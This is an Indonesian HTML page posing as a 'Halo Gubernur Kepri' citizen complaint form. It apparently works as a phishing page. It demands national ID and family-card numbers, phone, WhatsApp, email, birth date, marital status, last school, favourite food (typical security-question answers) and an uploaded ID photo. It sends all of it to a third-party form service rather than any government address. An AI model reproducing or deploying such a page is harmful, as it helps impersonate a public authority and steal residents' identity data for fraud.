<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SAHABAT KEPRI - Tika Ikbal</title>
    <style>
        :root {
            --gold-primary: #FFD700;
            --gold-dark: #B8860B;
            --dark-bg: #0a0a0a;
            --matrix-green: #00ff41;
        }

        body {
            background-color: var(--dark-bg);
            color: #e0e0e0;
            font-family: 'Orbitron', sans-serif, Arial;
            margin: 0;
            padding: 20px;
            background-image: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
        }

        .container {
            max-width: 850px;
            margin: auto;
            background: rgba(15, 15, 15, 0.95);
            padding: 40px;
            border: 2px solid var(--gold-primary);
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2), inset 0 0 15px rgba(255, 215, 0, 0.1);
        }

        .logo-emas {
            text-align: center;
            font-size: 2.5rem;
            font-weight: bold;
            background: linear-gradient(to bottom, #FFD700 0%, #FFFACD 50%, #B8860B 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .sub-header {
            text-align: center;
            color: var(--gold-primary);
            font-size: 1.1rem;
            margin-bottom: 30px;
            letter-spacing: 2px;
        }

        .section-title {
            border-left: 4px solid var(--gold-primary);
            padding-left: 15px;
            margin: 30px 0 15px 0;
            color: var(--gold-primary);
            font-weight: bold;
            text-transform: uppercase;
        }

        .grid-form {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        @media (max-width: 650px) {
            .grid-form { grid-template-columns: 1fr; }
        }

        .input-group {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 8px;
            font-size: 0.85rem;
            color: #bbb;
        }

        input, select, textarea {
            background: #121212;
            border: 1px solid #333;
            color: white;
            padding: 14px;
            border-radius: 8px;
            outline: none;
            transition: 0.3s ease;
        }

        input:focus, textarea:focus {
            border-color: var(--gold-primary);
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
        }

        .full-width {
            grid-column: span 2;
        }

        @media (max-width: 650px) {
            .full-width { grid-column: span 1; }
        }

        .btn-submit {
            width: 100%;
            padding: 18px;
            margin-top: 40px;
            background: linear-gradient(45deg, var(--gold-dark), var(--gold-primary));
            color: black;
            border: none;
            font-weight: bold;
            font-size: 1.2rem;
            cursor: pointer;
            border-radius: 10px;
            text-transform: uppercase;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: 0.3s;
        }

        .btn-submit:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
            filter: brightness(1.1);
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 0.9rem;
            color: var(--gold-primary);
            opacity: 0.8;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-emas">HALO GUBERNUR KEPRI</div>
    <div class="sub-header">SAHABAT KEPRI - Tika Ikbal</div>

    <form action="https://formbold.com/s/6lj4Q" method="POST" enctype="multipart/form-data">
        
        <div class="section-title">Kontak & Identitas Utama</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Nomor Telepon</label>
                <input type="tel" name="Nomor_Telepon" placeholder="08..." required>
            </div>
            <div class="input-group">
                <label>Nomor WhatsApp</label>
                <input type="tel" name="WhatsApp" placeholder="08..." required>
            </div>
            <div class="input-group full-width">
                <label>Alamat E-mail</label>
                <input type="email" name="Email" placeholder="email@anda.com" required>
            </div>
            <div class="input-group">
                <label>Nomor KTP (NIK)</label>
                <input type="number" name="NIK" required>
            </div>
            <div class="input-group">
                <label>Nomor Kartu Keluarga (KK)</label>
                <input type="number" name="No_KK" required>
            </div>
        </div>

        <div class="section-title">Tempat & Tanggal Lahir</div>
        <div class="grid-form" style="grid-template-columns: 1fr 1fr 1fr;">
            <div class="input-group">
                <label>Hari (Tgl)</label>
                <input type="number" name="Tgl_Lahir" min="1" max="31" placeholder="01">
            </div>
            <div class="input-group">
                <label>Bulan</label>
                <select name="Bulan_Lahir">
                    <option value="Januari">Januari</option>
                    <option value="Februari">Februari</option>
                    <option value="Maret">Maret</option>
                    <option value="April">April</option>
                    <option value="Mei">Mei</option>
                    <option value="Juni">Juni</option>
                    <option value="Juli">Juli</option>
                    <option value="Agustus">Agustus</option>
                    <option value="September">September</option>
                    <option value="Oktober">Oktober</option>
                    <option value="November">November</option>
                    <option value="Desember">Desember</option>
                </select>
            </div>
            <div class="input-group">
                <label>Tahun</label>
                <input type="number" name="Tahun_Lahir" placeholder="1990">
            </div>
        </div>

        <div class="section-title">Lokasi Domisili (Hingga Pelosok)</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Provinsi</label>
                <input type="text" name="Provinsi" value="Kepulauan Riau" readonly>
            </div>
            <div class="input-group">
                <label>Kabupaten/Kota</label>
                <input type="text" name="Kabupaten" placeholder="Contoh: Karimun/Batam">
            </div>
            <div class="input-group">
                <label>Kecamatan</label>
                <input type="text" name="Kecamatan">
            </div>
            <div class="input-group">
                <label>Desa/Kelurahan (Desa Terpencil)</label>
                <input type="text" name="Desa_Pelosok" placeholder="Nama Desa Anda">
            </div>
        </div>

        <div class="section-title">Informasi Tambahan & Hobby</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Status Pernikahan</label>
                <select name="Status_Nikah">
                    <option value="Sudah Menikah">Sudah Menikah</option>
                    <option value="Belum Menikah">Belum Menikah</option>
                    <option value="Cerai">Cerai</option>
                </select>
            </div>
            <div class="input-group">
                <label>Pernah Sekolah Dimana?</label>
                <input type="text" name="Riwayat_Sekolah" placeholder="Nama Sekolah Terakhir">
            </div>
            <div class="input-group">
                <label>Makanan Kesukaan</label>
                <input type="text" name="Makanan_Suka" placeholder="Contoh: Nasi Dagang/Lutong">
            </div>
            <div class="input-group">
                <label>Upload Foto Tanda Pengenal</label>
                <input type="file" name="Foto_Identitas">
            </div>
        </div>

        <div class="section-title">Kotak Keluhan & Aspirasi</div>
        <div class="input-group full-width">
            <label>Tuliskan Keluhan Anda Di Sini</label>
            <textarea name="Keluhan_Masyarakat" rows="6" placeholder="Ceritakan kendala atau bantuan yang anda butuhkan..."></textarea>
        </div>

        <button type="submit" class="btn-submit">KIRIM ADUAN SEKARANG</button>
    </form>

    <div class="footer">
        Dikelola oleh: <strong>Tika Ikbal Software House</strong>
    </div>
</div>

</body>
</html>
